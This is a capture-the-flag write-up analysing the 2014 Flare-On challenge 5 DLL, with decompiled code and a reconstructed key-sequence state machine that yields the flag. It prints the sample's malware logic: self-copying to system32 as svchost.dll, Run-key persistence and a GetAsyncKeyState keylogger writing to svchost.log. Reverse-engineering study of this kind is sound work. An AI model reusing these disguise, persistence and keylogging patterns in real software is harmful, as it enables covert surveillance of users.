---
layout: post
title: "Flare-On 2014 - Challenge 5"
date: 2026-04-26 12:35:15 +0200
categories: [Reverse Engineering, Flare-On]
challenge_year: 2014
challenge_num: 5
---
# 2014 Flare-On Challenge 5
*All the Flare-On annual challenges can be found [here](https://flare-on.com/).*

## Executive Summary
This write-up covers the fifth challenge of the 2014 Flare-On series. The objective is to extract a hidden flag from a Windows DLL. The solution involves static analysis to identify a dropper/persistence mechanism and a keylogger payload, followed by manually tracing a global state machine hidden inside individual key handler functions to reconstruct the correct key sequence that reveals the flag.

**Tools used:** exiftool, DIE, Ghidra

---

## 1. Initial Triage

First let's see what exiftool says about this file:

![exiftool details about the file](/assets/images/2014/Challenge5/image.png)

Looks like it's a DLL file, but I want to also drop it into DIE:

![DIE details about the file](/assets/images/2014/Challenge5/image-1.png)

Now I'll rename the file to add the `.dll` extension.

Time to open the code in Ghidra and look around.

## 2. Static Analysis

### 2.1 Entry Point and Dropper Logic

There is one interesting function `FUN_1000a680`:

```c
void FUN_1000a680(void)

{
  BOOL BVar1;
  DWORD DVar2;
  undefined **ppuVar3;
  char *_Format;
  HMODULE local_120;
  undefined4 local_11c;
  undefined4 local_118;
  int local_114;
  HWND local_110;
  CHAR local_10c [260];
  uint local_8;
  
  local_8 = DAT_100185b4 ^ (uint)&stack0xfffffffc;
  AllocConsole();
  local_110 = FindWindowA("ConsoleWindowClass",(LPCSTR)0x0);
  ShowWindow(local_110,0);
  local_114 = FUN_1000a570();
  local_120 = (HMODULE)0x0;
  BVar1 = GetModuleHandleExA(6,(LPCSTR)FUN_1000a610,&local_120);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    _Format = "GetModuleHandle returned %d\n";
    ppuVar3 = FUN_1000ad77();
    _fprintf((FILE *)(ppuVar3 + 0x10),_Format,DVar2);
  }
  GetModuleFileNameA(local_120,local_10c,0x100);
  if (local_114 == 2) {
    CopyFileA(local_10c,"c:\\windows\\system32\\svchost.dll",0);
    local_118 = FUN_1000a610((BYTE *)
                             "c:\\windows\\system32\\rundll32.exe c:\\windows\\system32\\svchost.dll "
                            );
  }
  local_11c = FUN_1000a4c0();
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}
```

This is immediately suspicious. It creates a console then hides it with `ShowWindow(..., 0)`. It copies itself to `system32` disguised as `svchost.dll` and executes itself via `rundll32` from that new location. Whatever this is, it wants to hide as a legitimate Windows process.

There are three more functions to check: `FUN_1000a570`, `FUN_1000a610`, and `FUN_1000a4c0`.

### 2.2 Persistence Check: `FUN_1000a570`

```c
void FUN_1000a570(void)

{
  BYTE local_6c [84];
  uint local_18;
  HKEY local_14;
  LSTATUS local_10;
  DWORD local_c [2];
  
  local_18 = DAT_100185b4 ^ (uint)&stack0xfffffffc;
  local_c[0] = 0x50;
  local_10 = RegOpenKeyExA((HKEY)0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,1,
                           &local_14);
  if (local_10 == 0) {
    local_10 = RegQueryValueExA(local_14,"svchost",(LPDWORD)0x0,(LPDWORD)0x0,local_6c,local_c);
    if ((local_10 != 0) || (0x50 < local_c[0])) {
      local_c[1] = 2;
    }
    if (local_10 == 0) {
      local_c[1] = 0;
    }
    RegCloseKey(local_14);
  }
  else {
    local_c[1] = 1;
  }
  __security_check_cookie(local_18 ^ (uint)&stack0xfffffffc);
  return;
}
```

Ghidra got the return type wrong, this clearly returns a status code. It opens `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and checks for a value named `"svchost"`. The return value signals the installation state: `1` means the key couldn't be opened, `2` means the entry is missing or malformed, `0` means it's already correctly installed. This feeds back into the `if (local_114 == 2)` branch in the parent function, only copy and register if not yet installed.

### 2.3 Persistence Writer: `FUN_1000a610`

```c
undefined4 __cdecl FUN_1000a610(BYTE *param_1)

{
  LSTATUS LVar1;
  size_t cbData;
  HKEY local_c;
  undefined4 local_8;
  
  LVar1 = RegCreateKeyA((HKEY)0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                        &local_c);
  if (LVar1 == 0) {
    cbData = _strlen((char *)param_1);
    RegSetValueExA(local_c,"svchost",0,1,param_1,cbData);
    local_8 = 0;
  }
  else if (LVar1 != 0) {
    local_8 = 1;
  }
  return local_8;
}
```

This is the writer counterpart to the previous reader. It writes `param_1`, the full `rundll32.exe` command string, as the `"svchost"` autorun value. Together the two functions form the complete persistence mechanism: check if installed, install if not. On every Windows startup the malware will silently re-execute itself.

### 2.4 The Payload: `FUN_1000a4c0`

```c
undefined4 FUN_1000a4c0(void)

{
  uint uVar1;
  void *_Dst;
  char *pcVar2;
  int iVar3;
  undefined2 local_c;
  
  do {
    uVar1 = FUN_1000abbe();
    iVar3 = (int)uVar1 % 200 + 0x32;
    _Dst = _malloc(iVar3 * 0xf);
    _memset(_Dst,0,iVar3 * 0xf);
    Sleep(10);
    local_c = 0;
    while (local_c < iVar3) {
      Sleep(10);
      pcVar2 = FUN_10009eb0();
      if (pcVar2 != (char *)0x0) {
        FUN_10001000(pcVar2);
        local_c = local_c + 1;
      }
    }
  } while( true );
}
```

This runs in an infinite loop. `FUN_1000abbe` is a standard Linear Congruential Generator using the magic constants `0x343fd` and `0x269ec3`, it generates a pseudo-random number used to vary the loop count and buffer size, making the memory pattern less predictable. The `Sleep(10)` calls slow down key polling to avoid hogging the CPU.

`FUN_10009eb0` polls `GetAsyncKeyState` for each virtual key code in a loop, and `FUN_10001000` writes whatever is returned to a file:

```c
undefined4 __cdecl FUN_10001000(char *param_1)

{
  FILE *local_8;
  
  local_8 = (FILE *)0x0;
  while (local_8 == (FILE *)0x0) {
    Sleep(10);
    local_8 = _fopen("svchost.log","a+");
  }
  _fputs(param_1,local_8);
  _fclose(local_8);
  return 1;
}
```

Every keypress gets appended to `svchost.log`. **This is a keylogger.**

### 2.5 The State Machine

`FUN_10009eb0` maps Windows Virtual Key codes to individual handler functions. The key codes `0x41`-`0x5A` correspond directly to A-Z, and the numeric keys map similarly. Rather than just returning the character, each handler function manipulates a set of global variables.

One function stands out, pressing `0` calls `FUN_10009440`, which unlike the others does not simply return a character but checks and sets global state variables. Digging into the reset function it calls, `FUN_10001060`, reveals it zeroes out 40+ consecutive global `DAT_` addresses and resets a sentinel `DAT_10017000 = 1`.

This is a **state machine**. Each global variable is a gate, the correct key sets the next gate, and any wrong key triggers a full reset. The flag itself is the key sequence that advances the machine from start to finish.

Renaming all variables and handlers to meaningful names makes the chain readable:

```c
int SEQ_NOT_STARTED = 1,
    FIRST_LETTER_L = 0,
    FIRST_LETTER_0 = 0,
    FIRST_LETTER_G = 0,
    SECOND_LETTER_G = 0,
    FIRST_LETTER_I = 0,
    FIRST_LETTER_N = 0,
    THIRD_LETTER_G = 0,
    FIRST_LETTER_D = 0,
    FIRST_LETTER_O = 0,
    FIRST_LETTER_T = 0,
    FIRST_LETTER_U = 0,
    FIRST_LETTER_R = 0,
    SECOND_LETTER_D = 0,
    SECOND_LETTER_O = 0,
    SECOND_LETTER_T = 0,
    FIRST_LETTER_5 = 0,
    THIRD_LETTER_T = 0,
    SECOND_LETTER_R = 0,
    SECOND_LETTER_0 = 0,
    FIRS_LETTER_K = 0,
    FIRST_LETTER_E = 0,
    SECOND_LETTER_5 = 0,
    FIRST_LETTER_A = 0,
    FOURTH_LETTER_T = 0,
    FIRST_LETTER_F = 0,
    SECOND_LETTER_L = 0,
    SECOND_LETTER_A = 0,
    THIRD_LETTER_R = 0,
    SECOND_LETTER_E = 0,
    THIRD_LETTER_D = 0,
    THIRD_LETTER_A = 0,
    FIRST_LETTER_S = 0,
    FIRST_LETTER_H = 0,
    THIRD_LETTER_O = 0,
    SECOND_LETTER_N = 0,
    FOURTH_LETTER_D = 0,
    FOURTH_LETTER_O = 0,
    FIFTH_LETTER_T = 0,
    FIRST_LETTER_C = 0,
    FIFTH_LETTER_O = 0;


void RESET(void)
{
  SEQ_NOT_STARTED = 1;
  FIRST_LETTER_L = 0;
  FIRST_LETTER_0 = 0;
  FIRST_LETTER_G = 0;
  SECOND_LETTER_G = 0;
  FIRST_LETTER_I = 0;
  FIRST_LETTER_N = 0;
  THIRD_LETTER_G = 0;
  FIRST_LETTER_D = 0;
  FIRST_LETTER_O = 0;
  FIRST_LETTER_T = 0;
  FIRST_LETTER_U = 0;
  FIRST_LETTER_R = 0;
  SECOND_LETTER_D = 0;
  SECOND_LETTER_O = 0;
  SECOND_LETTER_T = 0;
  FIRST_LETTER_5 = 0;
  THIRD_LETTER_T = 0;
  SECOND_LETTER_R = 0;
  SECOND_LETTER_0 = 0;
  FIRS_LETTER_K = 0;
  FIRST_LETTER_E = 0;
  SECOND_LETTER_5 = 0;
  FIRST_LETTER_A = 0;
  FOURTH_LETTER_T = 0;
  FIRST_LETTER_F = 0;
  SECOND_LETTER_L = 0;
  SECOND_LETTER_A = 0;
  THIRD_LETTER_R = 0;
  SECOND_LETTER_E = 0;
  THIRD_LETTER_D = 0;
  THIRD_LETTER_A = 0;
  FIRST_LETTER_S = 0;
  FIRST_LETTER_H = 0;
  THIRD_LETTER_O = 0;
  SECOND_LETTER_N = 0;
  FOURTH_LETTER_D = 0;
  FOURTH_LETTER_O = 0;
  FIFTH_LETTER_T = 0;
  FIRST_LETTER_C = 0;
  FIFTH_LETTER_O = 0;
  return;
}

char LETTER_0(void)
{
  if (FIRST_LETTER_L < 1) {
    if (SECOND_LETTER_R < 1) {
      RESET();
    }
    else {
      SECOND_LETTER_R = 0;
      SECOND_LETTER_0 = 1;
    }
  }
  else {
    FIRST_LETTER_L = 0;
    FIRST_LETTER_0 = 1;
  }
  return "0";
}

char LETTER_A(void)

{
  if (SECOND_LETTER_5 < 1) {
    if (SECOND_LETTER_L < 1) {
      if (THIRD_LETTER_D < 1) {
        RESET();
      }
      else {
        THIRD_LETTER_D = 0;
        THIRD_LETTER_A = 1;
      }
    }
    else {
      SECOND_LETTER_L = 0;
      SECOND_LETTER_A = 1;
    }
  }
  else {
    SECOND_LETTER_5 = 0;
    FIRST_LETTER_A = 1;
  }
  return "a";
}

char LETTER_5(void)

{
  if (SECOND_LETTER_T < 1) {
    if (FIRST_LETTER_E < 1) {
      RESET();
    }
    else {
      FIRST_LETTER_E = 0;
      SECOND_LETTER_5 = 1;
    }
  }
  else {
    SECOND_LETTER_T = 0;
    FIRST_LETTER_5 = 1;
  }
  return "5";
}

char LETTER_U(void)

{
  if (FIRST_LETTER_T < 1) {
    RESET();
  }
  else {
    FIRST_LETTER_T = 0;
    FIRST_LETTER_U = 1;
  }
  return "u";
}

char LETTER_T(void)

{
  if (FIRST_LETTER_O < 1) {
    if (SECOND_LETTER_O < 1) {
      if (FIRST_LETTER_5 < 1) {
        if (FIRST_LETTER_A < 1) {
          if (FOURTH_LETTER_O < 1) {
            RESET();
          }
          else {
            FOURTH_LETTER_O = 0;
            FIFTH_LETTER_T = 1;
          }
        }
        else {
          FIRST_LETTER_A = 0;
          FOURTH_LETTER_T = 1;
        }
      }
      else {
        FIRST_LETTER_5 = 0;
        THIRD_LETTER_T = 1;
      }
    }
    else {
      SECOND_LETTER_O = 0;
      SECOND_LETTER_T = 1;
    }
  }
  else {
    FIRST_LETTER_O = 0;
    FIRST_LETTER_T = 1;
  }
  return "t";
}

char LETTER_S(void)

{
  if (THIRD_LETTER_A < 1) {
    RESET();
  }
  else {
    THIRD_LETTER_A = 0;
    FIRST_LETTER_S = 1;
  }
  return "s";
}

char LETTER_R(void)

{
  if (FIRST_LETTER_U < 1) {
    if (THIRD_LETTER_T < 1) {
      if (SECOND_LETTER_A < 1) {
        RESET();
      }
      else {
        SECOND_LETTER_A = 0;
        THIRD_LETTER_R = 1;
      }
    }
    else {
      THIRD_LETTER_T = 0;
      SECOND_LETTER_R = 1;
    }
  }
  else {
    FIRST_LETTER_U = 0;
    FIRST_LETTER_R = 1;
  }
  return "r";
}

char LETTER_O(void)

{
  if (FIRST_LETTER_D < 1) {
    if (SECOND_LETTER_D < 1) {
      if (FIRST_LETTER_H < 1) {
        if (FOURTH_LETTER_D < 1) {
          if (FIRST_LETTER_C < 1) {
            RESET();
          }
          else {
            FIRST_LETTER_C = 0;
            FIFTH_LETTER_O = 1;
          }
        }
        else {
          FOURTH_LETTER_D = 0;
          FOURTH_LETTER_O = 1;
        }
      }
      else {
        FIRST_LETTER_H = 0;
        THIRD_LETTER_O = 1;
      }
    }
    else {
      SECOND_LETTER_D = 0;
      SECOND_LETTER_O = 1;
    }
  }
  else {
    FIRST_LETTER_D = 0;
    FIRST_LETTER_O = 1;
  }
  return "o";
}

char LETTER_N(void)

{
  if (FIRST_LETTER_I < 1) {
    if (THIRD_LETTER_O < 1) {
      RESET();
    }
    else {
      THIRD_LETTER_O = 0;
      SECOND_LETTER_N = 1;
    }
  }
  else {
    FIRST_LETTER_I = 0;
    FIRST_LETTER_N = 1;
  }
  return "n";
}

char LETTER_L(void)

{
  if (SEQ_NOT_STARTED < 1) {
    if (FIRST_LETTER_F < 1) {
      RESET();
    }
    else {
      FIRST_LETTER_F = 0;
      SECOND_LETTER_L = 1;
    }
  }
  else {
    SEQ_NOT_STARTED = 0;
    FIRST_LETTER_L = 1;
  }
  return "l";
}

char LETTER_K(void)

{
  if (SECOND_LETTER_0 < 1) {
    RESET();
  }
  else {
    SECOND_LETTER_0 = 0;
    FIRS_LETTER_K = 1;
  }
  return "k";
}

char LETTER_I(void)

{
  if (SECOND_LETTER_G < 1) {
    RESET();
  }
  else {
    SECOND_LETTER_G = 0;
    FIRST_LETTER_I = 1;
  }
  return "i";
}

char LETTER_H(void)

{
  if (FIRST_LETTER_S < 1) {
    RESET();
  }
  else {
    FIRST_LETTER_S = 0;
    FIRST_LETTER_H = 1;
  }
  return "h";
}

char LETTER_G(void)

{
  if (FIRST_LETTER_0 < 1) {
    if (FIRST_LETTER_G < 1) {
      if (FIRST_LETTER_N < 1) {
        RESET();
      }
      else {
        FIRST_LETTER_N = 0;
        THIRD_LETTER_G = 1;
      }
    }
    else {
      FIRST_LETTER_G = 0;
      SECOND_LETTER_G = 1;
    }
  }
  else {
    FIRST_LETTER_0 = 0;
    FIRST_LETTER_G = 1;
  }
  return "g";
}

char LETTER_F(void)

{
  if (FOURTH_LETTER_T < 1) {
    RESET();
  }
  else {
    FOURTH_LETTER_T = 0;
    FIRST_LETTER_F = 1;
  }
  return "f";
}

char LETTER_E(void)

{
  if (FIRS_LETTER_K < 1) {
    if (THIRD_LETTER_R < 1) {
      RESET();
    }
    else {
      THIRD_LETTER_R = 0;
      SECOND_LETTER_E = 1;
    }
  }
  else {
    FIRS_LETTER_K = 0;
    FIRST_LETTER_E = 1;
  }
  return "e";
}

char LETTER_D(void)

{
  if (THIRD_LETTER_G < 1) {
    if (FIRST_LETTER_R < 1) {
      if (SECOND_LETTER_E < 1) {
        if (SECOND_LETTER_N < 1) {
          RESET();
        }
        else {
          SECOND_LETTER_N = 0;
          FOURTH_LETTER_D = 1;
        }
      }
      else {
        SECOND_LETTER_E = 0;
        THIRD_LETTER_D = 1;
      }
    }
    else {
      FIRST_LETTER_R = 0;
      SECOND_LETTER_D = 1;
    }
  }
  else {
    THIRD_LETTER_G = 0;
    FIRST_LETTER_D = 1;
  }
  return "d";
}

char LETTER_C(void)

{
  if (FIFTH_LETTER_T < 1) {
    RESET();
  }
  else {
    FIFTH_LETTER_T = 0;
    FIRST_LETTER_C = 1;
  }
  return "c";
}

char LETTER_M(void)

{
  if (0 < FIFTH_LETTER_O) {
    RESET();
    // FUN_10001240(); - Show congrats screen!
  }
  return "m";
}
```

The final key handler, pressing `m`, checks `FIFTH_LETTER_O` and if set calls `FUN_10001240`, which displays a `DialogBox` with the title `"FLARE ON!"` and an ASCII art representation of `"FLARE"` made of `N` and `D` characters as the congratulations message.

Tracing the full gate chain manually from `SEQ_NOT_STARTED` through every handler reconstructs the complete key sequence, which spells out the flag directly.

## 3. Extracting the Flag

Following the state machine chain from start to finish:

`SEQ_NOT_STARTED` → `l` → `0` → `g` → `g` → `i` → `n` → `g` → `d` → `o` → `t` → `u` → `r` → `d` → `o` → `t` → `5` → `t` → `r` → `0` → `k` → `e` → `5` → `a` → `t` → `f` → `l` → `a` → `r` → `e` → `d` → `a` → `s` → `h` → `o` → `n` → `d` → `o` → `t` → `c` → `o` → `m`

The flag is:

**`l0gging.ur.5tr0ke5@flare-on.com`**